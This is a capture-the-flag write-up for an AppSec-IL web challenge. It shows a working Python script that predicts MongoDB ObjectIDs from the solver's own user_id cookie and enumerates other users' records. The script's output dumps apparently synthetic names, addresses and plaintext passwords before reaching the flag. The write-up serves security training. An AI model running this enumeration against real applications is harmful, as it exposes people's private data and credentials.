# HR Agency 
* Category: Web
* 250 Points
* Solved by the JCTF Team

## Description
> Welcome to the HR agency!
> 
> You can updates your bio and personal details by the following link and credentials:
> 
> URL: https://hragency.appsecil.ctf.today/
> 
> Email: paula74@hunter-harris.net
> 
> Password: x!k_856hBM
> 
> Note: please don’t set your private used password, there are hackers that leaking our data.

## Hint

> NoSQL objectifying people!

## Solution

Using the provided credentials, we can login to an HR system which contains several personal details (Name, email, etc.).

The sources contain the following logic for personal information retrieval:

```javascript
    fetch("/api/getUserDetails", {
        method: 'post',
        body: JSON.stringify({"user_id":getCookie("user_id")}),
    })
    .then(res => res.json()).then(function(res) {
        if(!res.isSuccess) {
          $("#response").html(`<div class="alert alert-danger" role="alert">${res.errorMessage}</div>`)
          return
        }
        $("#firstName").val(res.first_name)
        $("#lastName").val(res.last_name)
        $("#email").val(res.email)
        $("#company").val(res.company)
        $("#job").val(res.job)
        $("#phone_number").val(res.phone_number)
        $("#address").val(res.address)
        $("#about").html(res.about)
    });
    document.querySelector('form').addEventListener('submit', event => {
        event.preventDefault();
        $("#response").html(`<div class="alert alert-danger" role="alert">Currently unavailable!</div>`)
    });
```

When logging in, the server sets two cookies:
```console
root@kali:/media/sf_CTFs/appsec/HR_Agency# curl 'https://hragency.appsecil.ctf.today/api/login' --data-raw '{"email":"paula74@hunter-harris.net","password":"x!k_856hBM"}' -q -v 2>&1 | grep cookie
< set-cookie: access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6InBhdWxhNzRAaHVudGVyLWhhcnJpcy5uZXQifQ.Z1izJjkHOFq2XTf3xLDApb73S3EtywfZKVUvfEIoq3A; Path=/; SameSite=lax
< set-cookie: user_id=5f8b2e54a5b8134d764f65a8; Path=/; SameSite=lax
```

The first one is a JWT with the user email:
```console
root@kali:/media/sf_CTFs/appsec/HR_Agency# python3 ~/utils/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6InBhdWxhNzRAaHVudGVyLWhhcnJpcy5uZXQifQ.Z1izJjkHOFq2XTf3xLDApb73S3EtywfZKVUvfEIoq3A

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
  Version 2.0                 \______|             @ticarpi

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "HS256"

Token payload values:
[+] email = "paula74@hunter-harris.net"
```

The second is a user-id. 

We tried many things for this challenge - attacking the token, injections, etc. but with no success. At some point, after no one was able to solve the challenge, a hint was released:

> NoSQL objectifying people!

This hint sent us again towards NoSQL injection, but nothing seemed to work. At last, we realized that "objectifying" was pointing us towards the user-id, which in fact looks like a [MongoDB ObjectID](https://docs.mongodb.com/manual/reference/method/ObjectId/):

 
> * a 4-byte timestamp value, representing the ObjectId’s creation, measured in seconds since the Unix epoch
> * a 3-byte machine identifier
> * a 2-byte process id
> * a 3-byte counter, starting with a random value

Although there is some randomness in the object ID definition, it is quite predictable, especially if you already know a certain object ID. In our case, we have our own user-id, allowing us to easily try and guess other user-IDs.

We can use the [mongo-objectid-predict](https://github.com/andresriancho/mongo-objectid-predict) Python library for this, and script it all with the following script:

```python
from mongo_objectid_predict import predict
import requests

s = requests.Session()
s.post("https://hragency.appsecil.ctf.today/api/login", json = {"email":"paula74@hunter-harris.net", "password":"x!k_856hBM"})

print ("Base User ID: {}".format(s.cookies['user_id']))
print("-" * 30)

for objectid in predict(base = s.cookies["user_id"],
                        backward = True,
                        counter_diff = 100):
    r = s.post("https://hragency.appsecil.ctf.today/api/getUserDetails", json={"user_id": objectid})
    response = r.json()

    if response["isSuccess"]:
        print("User ID: {}".format(objectid))
        print(response)
        print("-" * 30)

    if "AppSec-IL" in r.text:
        print ("Found flag!")
        break
```

Output:

```console
root@kali:/media/sf_CTFs/appsec/HR_Agency# python solve.py
Base User ID: 5f8b2e54a5b8134d764f65a8
------------------------------
User ID: 5f8b2e53a5b8134d764f65a7
{u'phone_number': u'6193305363', u'about': u'Together safe factor then five experience technology.\nDiscuss far start myself. Bag event for in data. Knowledge hard thought bring.', u'last_name': u'White', u'company': u'Townsend-Wells', u'first_name': u'Travis', u'isSuccess': True, u'job': u'Microbiologist', u'address': u'7630 Tara Prairie\nThomasfurt, AK 25300', u'password': u'_s3C^o^b88', u'email': u'waynepage@hotmail.com'}
------------------------------
User ID: 5f8b2e52a5b8134d764f65a6
{u'phone_number': u'398-795-9615x93405', u'about': u'His third win do. Maintain music million see concern region section.\nWould like participant young Mr see. You would dog reduce certainly space against.', u'last_name': u'Reed', u'company': u'Hawkins-Blake', u'first_name': u'Alec', u'isSuccess': True, u'job': u'Engineer, aeronautical', u'address': u'062 Natalie Fields Suite 186\nAndersonbury, WY 52085', u'password': u'k%Fd8EswVM', u'email': u'fholmes@martinez.com'}
------------------------------
User ID: 5f8b2e51a5b8134d764f65a5
{u'phone_number': u'(365)469-7243', u'about': u'Me partner question quite church political every. Range value should east as agent. Through during growth boy nation.\nEight feeling sea learn child whom. Town charge more a professor later.', u'last_name': u'Miller', u'company': u'Delgado, Lewis and Blankenship', u'first_name': u'Francisco', u'isSuccess': True, u'job': u'Chief of Staff', u'address': u'1312 Roger Parks Suite 615\nKochmouth, VT 15163', u'password': u'FV3$t6Irn)', u'email': u'rhobbs@martinez.info'}
------------------------------
User ID: 5f8b2e50a5b8134d764f65a4
{u'phone_number': u'+1-850-328-6198x862', u'about': u'Share art author section ahead travel once. Note themselves bad cell federal development.\nEverything wear large if official. Stage result trade democratic so course school.', u'last_name': u'Fisher', u'company': u'Williams, Burnett and Johnson', u'first_name': u'Dillon', u'isSuccess': True, u'job': u'Network engineer', u'address': u'733 Hawkins Land Suite 694\nCarlsonland, VA 28474', u'password': u'eH9IaHHpS&', u'email': u'antoniomitchell@estrada.com'}
------------------------------
User ID: 5f8b2e4fa5b8134d764f65a3
{u'phone_number': u'378.908.0361x04988', u'about': u'Prepare safe life over life wonder. Develop he raise head. Growth return truth.\nProcess huge chair candidate.', u'last_name': u'White', u'company': u'Woodward Group', u'first_name': u'Eric', u'isSuccess': True, u'job': u'Acupuncturist', u'address': u'95640 Little Viaduct Suite 578\nRodriguezmouth, AL 12988', u'password': u'+6)Ebyu^J(', u'email': u'johnspencer@gmail.com'}
------------------------------
User ID: 5f8b2e4ea5b8134d764f65a2
{u'phone_number': u'441-684-2040x5536', u'about': u'Any figure paper analysis recently if. Matter decide church both citizen. Together wide himself amount argue cover push.', u'last_name': u'Parker', u'company': u'Riley-Rojas', u'first_name': u'Marc', u'isSuccess': True, u'job': u'Freight forwarder', u'address': u'2415 Brian Vista\nNew Ariana, AK 53361', u'password': u'ht+028UpAk', u'email': u'richardcochran@alvarado.com'}
------------------------------
User ID: 5f8b2e4da5b8134d764f65a1
{u'phone_number': u'555-447-1033x091', u'about': u'Cause kid serve figure game. Miss set century to serious.\nReason high thought anything newspaper alone culture. Most buy spring possible guy point. Degree do material life almost occur claim.', u'last_name': u'Blanchard', u'company': u'Fowler Ltd', u'first_name': u'Brittany', u'isSuccess': True, u'job': u'Osteopath', u'address': u'2007 Karen Oval Suite 835\nGarciaberg, WY 53327', u'password': u'!2RJRIwAsN', u'email': u'xanderson@combs.com'}
------------------------------
User ID: 5f8b2e4ba5b8134d764f65a0
{u'phone_number': u'863.990.6911x6105', u'about': u'Establish type church manage assume recently beyond. Heavy detail red forward. Couple least someone young stock attack word.', u'last_name': u'Walker', u'company': u'Cooper Ltd', u'first_name': u'Caitlin', u'isSuccess': True, u'job': u'Development worker, international aid', u'address': u'9368 Maxwell Underpass\nNorth Paigefort, AZ 89000', u'password': u'eiUYN9Vl_8', u'email': u'lawrencedavid@yahoo.com'}
------------------------------
User ID: 5f8b2e4aa5b8134d764f659f
{u'phone_number': u'001-234-777-7718x82735', u'about': u'Great thousand thus however Congress themselves reality after. Money system movie blue. Local movie want our.\nAccount own prevent fear. Note investment class say increase. Free him course.', u'last_name': u'Stokes', u'company': u'Parks, Orr and Jones', u'first_name': u'Edward', u'isSuccess': True, u'job': u'Conservation officer, historic buildings', u'address': u'08370 Smith Oval Suite 752\nPort Amy, RI 56164', u'password': u'*FPi(Q9BL8', u'email': u'hkirk@hotmail.com'}
------------------------------
User ID: 5f8b2e49a5b8134d764f659e
{u'phone_number': u'(414)365-8127x9728', u'about': u'Try likely what happen meeting. Instead true within provide they service. Move detail might beautiful often myself represent.', u'last_name': u'White', u'company': u'Aguilar, Mosley and Madden', u'first_name': u'Jessica', u'isSuccess': True, u'job': u'Therapist, horticultural', u'address': u'26995 Kristen Crossing Suite 657\nBowersberg, WY 50637', u'password': u'^lcDi9ush0', u'email': u'ethomas@gmail.com'}
------------------------------
User ID: 5f8b2e48a5b8134d764f659d
{u'phone_number': u'9849489192', u'about': u'Per word industry hand positive hot threat focus. Present away those speech nor.', u'last_name': u'Terry', u'company': u'Gonzalez, Garcia and Costa', u'first_name': u'Susan', u'isSuccess': True, u'job': u'Event organiser', u'address': u'165 Jackson Alley Suite 839\nAndrewport, NH 22881', u'password': u')OvK9sXhCc', u'email': u'asmith@mullins.net'}
------------------------------
User ID: 5f8b2e47a5b8134d764f659c
{u'phone_number': u'106.445.2030x06913', u'about': u'Suffer institution tax eat player. Hot although former technology five manage glass. Between reach stage according special must.', u'last_name': u'Garrett', u'company': u'Vasquez and Sons', u'first_name': u'Ryan', u'isSuccess': True, u'job': u'Quarry manager', u'address': u'297 Buckley Bypass Suite 314\nMaynardborough, UT 30237', u'password': u'n3#WIk!V+P', u'email': u'stacybrock@hotmail.com'}
------------------------------
User ID: 5f8b2e46a5b8134d764f659b
{u'phone_number': u'+1-336-454-5912', u'about': u'According throw sing. Stock quickly toward significant side into. Leader must approach collection entire.', u'last_name': u'Mayer', u'company': u'Solomon, Montoya and Jones', u'first_name': u'Louis', u'isSuccess': True, u'job': u'Community development worker', u'address': u'44794 Gerald Keys Suite 426\nLake Christopher, AZ 15437', u'password': u')t(Uf%*G4y', u'email': u'wesleynorris@gmail.com'}
------------------------------
User ID: 5f8b2e45a5b8134d764f659a
{u'phone_number': u'774-940-7657x0151', u'about': u'Various know office. Who sing suggest prepare painting necessary.\nStudent year matter skin improve she travel manager. Nearly dinner across class certainly not. Office customer show ability world.', u'last_name': u'Galvan', u'company': u'Dawson-Sutton', u'first_name': u'Julie', u'isSuccess': True, u'job': u'Waste management officer', u'address': u'44548 Rivera Port\nEast Benjamintown, MT 92210', u'password': u'SUQc$k2Z%3', u'email': u'tallen@rose.com'}
------------------------------
User ID: 5f8b2e44a5b8134d764f6599
{u'phone_number': u'183.623.6344', u'about': u'Decade both perform building. Population record deep administration.\nFor sure by article suggest support listen special. Leader person admit. Whom then something for my better.', u'last_name': u'Jimenez', u'company': u'Golden LLC', u'first_name': u'Paul', u'isSuccess': True, u'job': u'Energy manager', u'address': u'14921 Michael Falls Apt. 249\nLake Dawn, UT 58368', u'password': u'%iwQyi$4n6', u'email': u'annajohnson@yahoo.com'}
------------------------------
User ID: 5f8b2e43a5b8134d764f6598
{u'phone_number': u'179.704.2644x4744', u'about': u'Book class change bit ever by level.\nTerm cold speak gas color. Unit hour player seat. Artist where city police worker blood strategy.', u'last_name': u'Patterson', u'company': u'Jensen-Cooper', u'first_name': u'Mark', u'isSuccess': True, u'job': u'Multimedia programmer', u'address': u'214 White Park Apt. 896\nLake Sarah, PA 01123', u'password': u'*q4WCgFwsr', u'email': u'grios@hotmail.com'}
------------------------------
User ID: 5f8b2e42a5b8134d764f6597
{u'phone_number': u'+1-570-153-1451', u'about': u'Century traditional much music. Cause most even attack about design believe.', u'last_name': u'Simmons', u'company': u'Moreno Group', u'first_name': u'Greg', u'isSuccess': True, u'job': u'Therapist, art', u'address': u'05710 Tyler Road\nLake Matthew, TX 26468', u'password': u'+tm0iX)&Y)', u'email': u'sharon75@roach.com'}
------------------------------
User ID: 5f8b2e41a5b8134d764f6596
{u'phone_number': u'953-324-8463', u'about': u'Trip daughter mother. Side picture person father step left. Kind bed game project offer.\nContain serious job.', u'last_name': u'Harrell', u'company': u'Stevens-White', u'first_name': u'Sarah', u'isSuccess': True, u'job': u'Occupational hygienist', u'address': u'069 Reeves Ridge\nNew Lindatown, SD 35807', u'password': u'!hEjcyqk2M', u'email': u'austinchristopher@gmail.com'}
------------------------------
User ID: 5f8b2e40a5b8134d764f6595
{u'phone_number': u'(010)918-7788x1793', u'about': u'Friend entire sport stop method pull speech. Level idea American many item though choose support. But carry they.', u'last_name': u'Boyd', u'company': u'Walters-Harris', u'first_name': u'Gregory', u'isSuccess': True, u'job': u'Radiographer, therapeutic', u'address': u'708 Moore Trafficway Apt. 601\nWest Travis, SD 85948', u'password': u'VN2uivNk$3', u'email': u'simonann@hotmail.com'}
------------------------------
User ID: 5f8b2e40a5b8134d764f6594
{u'phone_number': u'+972123456', u'about': u'Nimrod Levy is a seasoned security researcher with over a decade of experience in the field of web application penetration testing and infrastructure attack simulations (i.e Red Team).', u'last_name': u'Levy', u'company': u'SCORPIONES LTD', u'first_name': u'Nimrod', u'isSuccess': True, u'job': u'CTO, Co-Founder', u'address': u'WHERE?', u'password': u'AppSec-IL{M0ng0DB0bjectIdIsPr3d1ct4bl3!}', u'email': u'El3ct71k@Gmail.com'}
------------------------------
Found flag!
```

The flag: `AppSec-IL{M0ng0DB0bjectIdIsPr3d1ct4bl3!}`